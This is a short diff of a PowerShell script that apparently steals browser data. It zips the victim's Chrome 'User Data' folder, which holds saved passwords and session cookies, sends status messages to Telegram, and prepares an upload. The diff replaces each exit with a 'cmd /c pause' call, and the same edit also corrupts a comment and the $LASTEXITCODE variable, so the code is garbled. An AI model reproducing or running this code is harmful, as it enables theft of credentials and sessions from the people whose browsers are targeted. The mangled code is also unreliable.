@@ -99,21 +99,21 @@ if (-not (Test-Path $zipExePath)) {
 $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
 if (-not (Test-Path $chromePath)) {
     Send-TelegramMessage -message "Chrome User Data path not found!"
-    exit
+    cmd /c 'pause'
 }
 
-# Exit if 7zip path not found
+# cmd /c 'pause' if 7zip path not found
 if (-not (Test-Path $zipExePath)) {
     Send-TelegramMessage -message "7Zip path not found!"
-    exit
+    cmd /c 'pause'
 }
 
 # Create a zip of the Chrome User Data
 $outputZip = "$env:TEMP\chrome_data.zip"
 & $zipExePath a -r $outputZip $chromePath
-if ($LASTEXITCODE -ne 0) {
+if ($LASTcmd /c 'pause'CODE -ne 0) {
     Send-TelegramMessage -message "Error creating zip file with 7-Zip"
-    exit
+    cmd /c 'pause'
 }
 
 # Upload the file and get the link
